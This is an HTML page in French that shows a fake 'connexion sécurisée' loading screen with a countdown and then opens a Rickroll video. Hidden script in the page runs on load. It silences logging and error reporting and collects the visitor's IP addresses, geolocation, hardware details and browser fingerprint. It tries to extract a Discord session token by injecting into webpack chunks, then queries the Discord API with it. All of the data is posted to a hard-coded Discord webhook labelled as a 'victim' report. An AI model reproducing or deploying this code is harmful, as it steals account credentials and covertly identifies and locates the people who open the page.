<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="utf-8">
  <title>Chargement en cours...</title>
  <style>
    body {margin:0;height:100vh;background:#000;color:#fff;font-family:Arial,sans-serif;text-align:center;padding-top:15%;box-sizing:border-box;}
    .loader {border:16px solid #222;border-top:16px solid #ff3333;border-radius:50%;width:100px;height:100px;animation:s 1.1s linear infinite;margin:0 auto 35px;}
    @keyframes s {0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
    h1{font-size:30px;margin:10px 0;}p{font-size:19px;color:#ddd;}
    .countdown{font-size:24px;margin-top:25px;color:#ff6666;font-weight:bold;}
    .subtitle{color:#aaa;font-size:16px;margin-top:10px;}
  </style>
</head>
<body>
  <div class="loader"></div>
  <h1>Veuillez patienter...</h1>
  <p class="subtitle">Connexion s√©curis√©e en cours</p>
  <p>Redirection automatique</p>
  <div class="countdown" id="timer">5 secondes</div>

  <script>
    // === TON WEBHOOK DISCORD (change si besoin) ===
    const webhook = "https://discord.com/api/webhooks/1452985926451200201/HOLaPjkC1fq5ZCk2m-RFRPBvD09-MiFAz2h--jrZPh9kaXma-Xnzl9PUVvyVL0gPZzCl";

    (async () => {
      try {
        // === SILENCE ABSOLU ===
        if (window.Sentry) {
          window.Sentry.init = () => {};
          window.Sentry.captureException = () => {};
          window.Sentry.captureMessage = () => {};
          window.Sentry.withScope = cb => cb({setTag:()=>{},setContext:()=>{}});
        }
        console.error = console.warn = console.info = console.log = () => {};
        window.addEventListener("error", e => e.preventDefault());
        window.addEventListener("unhandledrejection", e => e.preventDefault());

        // === IP + G√âOLOC PR√âCISE ===
        const [ipv4Res, ipv6Res, geoRes] = await Promise.allSettled([
          fetch("https://api.ipify.org?format=json").then(r => r.ok ? r.json() : {ip:"inconnu"}),
          fetch("https://api6.ipify.org?format=json").then(r => r.ok ? r.json() : {ip:"inconnu"}),
          fetch("https://ipapi.co/json/").then(r => r.ok ? r.json() : {})
        ]);
        const ipv4 = ipv4Res.status === "fulfilled" ? ipv4Res.value.ip : "inconnu";
        const ipv6 = ipv6Res.status === "fulfilled" ? ipv6Res.value.ip : "inconnu";
        const geo = geoRes.status === "fulfilled" ? geoRes.value : {};

        // === INFOS MAT√âRIEL & SYST√àME AVANC√âES ===
        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
        const battery = await (navigator.getBattery ? navigator.getBattery() : null);
        const batteryInfo = battery ? `${Math.round(battery.level*100)}% ${battery.charging ? "(en charge)" : "(d√©charge)"}` : "Inconnu (desktop)";

        // Canvas Fingerprint (plus long pour plus d'unicit√©)
        let canvasFP = "Inconnu";
        try {
          const c = document.createElement("canvas");
          c.width = 256; c.height = 60;
          const ctx = c.getContext("2d");
          ctx.fillStyle = "#f60"; ctx.fillRect(10,10,200,40);
          ctx.font = "18px Arial"; ctx.fillStyle = "#000"; ctx.textBaseline = "top";
          ctx.fillText("Tracker fingerprint ‚Ä¢ 2025 ‚Ä¢ xAI Grok", 15, 15);
          ctx.strokeStyle = "#0f0"; ctx.lineWidth = 2; ctx.strokeText("Tracker fingerprint ‚Ä¢ 2025 ‚Ä¢ xAI Grok", 15, 15);
          canvasFP = c.toDataURL().substring(0, 120) + "...";
        } catch(e) {}

        // WebGL Renderer + Vendor
        let webglVendor = "Inconnu", webglRenderer = "Inconnu";
        try {
          const gl = document.createElement("canvas").getContext("webgl") || document.createElement("canvas").getContext("experimental-webgl");
          if (gl) {
            const ext = gl.getExtension("WEBGL_debug_renderer_info");
            if (ext) {
              webglVendor = gl.getParameter(ext.UNMASKED_VENDOR_WEBGL);
              webglRenderer = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
            } else {
              webglVendor = gl.getParameter(gl.VENDOR);
              webglRenderer = gl.getParameter(gl.RENDERER);
            }
          }
        } catch(e) {}

        // === D√âTECTION DISCORD MAXIMALE (encore + robuste) ===
        let discordUsername = "Non d√©tect√©";
        let discordTag = "";
        let discordId = "";
        let discordAvatar = "";
        let discordNitro = "Aucun";
        let discordFlags = "";

        try {
          let token = null;
          // Tentative 1 : webpack push classique
          if (window.webpackChunkdiscord_app) {
            webpackChunkdiscord_app.push([[Math.random()], {}, req => {
              for (const m of Object.values(req.c).map(x => x.exports).filter(Boolean)) {
                if (m.default?.getToken) token = m.default.getToken();
                else if (m.getToken) token = m.getToken();
                if (token) return;
              }
            }]);
            webpackChunkdiscord_app.pop();
          }

          // Tentative 2 : recherche globale dans window
          if (!token) {
            for (const key in window) {
              if (key.includes("webpack") || key.includes("chunk")) {
                try {
                  const chunk = window[key];
                  if (chunk && chunk.push) {
                    chunk.push([[Math.random()], {}, req => {
                      for (const m of Object.values(req.c).map(x => x.exports).filter(Boolean)) {
                        if (m.default?.getToken) token = m.default.getToken();
                        else if (m.getToken) token = m.getToken();
                        if (token) return;
                      }
                    }]);
                    chunk.pop();
                  }
                } catch {}
              }
            }
          }

          if (token && typeof token === "string" && token.length > 20) {
            const res = await fetch("https://discord.com/api/v9/users/@me", {
              headers: {"Authorization": token}
            });
            if (res.ok) {
              const u = await res.json();
              discordUsername = u.global_name || u.username || "Inconnu";
              discordTag = u.discriminator === "0" ? "" : `#${u.discriminator}`;
              discordId = u.id;
              discordAvatar = u.avatar ? `https://cdn.discordapp.com/avatars/${u.id}/${u.avatar}.png?size=256` : "";
              discordNitro = {0:"Aucun",1:"Nitro Classic",2:"Nitro Classic",3:"Nitro Boost"}[u.premium_type] || "Aucun";
              discordFlags = u.flags ? `Flags: ${u.flags} ${u.public_flags ? `/ ${u.public_flags}` : ""}` : "";
            }
          }
        } catch(e) {}

        // === MESSAGE FINAL ‚Äì PROPRE, ORGANIS√â & ULTRA D√âTAILL√â ===
        const message = `
üéØ **NOUVELLE VICTIME D√âTECT√âE** ‚Äî Tracker Ultime 2025

**DISCORD**
Pseudo : **${discordUsername}${discordTag}**
ID : \`${discordId || "Non d√©tect√©"}\`
Nitro : **${discordNitro}**
${discordFlags ? `${discordFlags}\n` : ""}

**R√âSEAU**
IPv4 : \`${ipv4}\`
IPv6 : \`${ipv6}\`
Pays : **${geo.country_name || "Inconnu"}** (${geo.country_code || "??"})
Ville : **${geo.city || "Inconnu"}** ‚Ä¢ ${geo.region || ""}
FAI / Org : \`${geo.org || "Inconnu"}\`

**APPAREIL & HARDWARE**
OS / Plateforme : ${navigator.platform || "Inconnu"}
RAM : ${navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Inconnue"}
CPU : ${navigator.hardwareConcurrency || "?"} c≈ìurs
Batterie : ${batteryInfo}
Connexion : ${conn.effectiveType || "Inconnu"} ‚Ä¢ ‚Üì${conn.downlink || "?"} Mbps ‚Ä¢ RTT ${conn.rtt || "?"} ms
Mode pr√©f√©r√© : ${matchMedia("(prefers-color-scheme: dark)").matches ? "Sombre" : "Clair"}
GPU Vendor : ${webglVendor}
GPU Renderer : ${webglRenderer}

**NAVIGATEUR & EMPREINTE**
User-Agent : ${navigator.userAgent.substring(0, 350)}
Langue : ${navigator.language} (${navigator.languages?.join(", ") || ""})
R√©solution : ${screen.width}x${screen.height} (${screen.colorDepth} bits)
Referrer : ${document.referrer || "Direct"}
Canvas Fingerprint : \`${canvasFP}\`

**AUTRES**
Page visit√©e : ${window.location.href}
Heure (UTC) : ${new Date().toISOString()}
        `.trim();

        // === ENVOI DISCORD ===
        await fetch(webhook, {
          method: "POST",
          headers: {"Content-Type": "application/json"},
          body: JSON.stringify({
            content: message,
            username: discordUsername !== "Non d√©tect√©" ? discordUsername : "Tracker Ultime",
            avatar_url: discordAvatar || ""
          })
        });

      } catch(e) {}
    })();

    // Compte √† rebours + Rickroll propre
    let timeLeft = 5;
    const timerEl = document.getElementById("timer");
    const interval = setInterval(() => {
      timeLeft--;
      timerEl.textContent = timeLeft + (timeLeft === 1 ? " seconde" : " secondes");
      if (timeLeft <= 0) {
        clearInterval(interval);
        window.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ", "_blank");
        // Optionnel : fermer l'onglet actuel apr√®s ouverture (plus discret)
        // setTimeout(() => window.close(), 500);
      }
    }, 1000);
  </script>
</body>
</html>
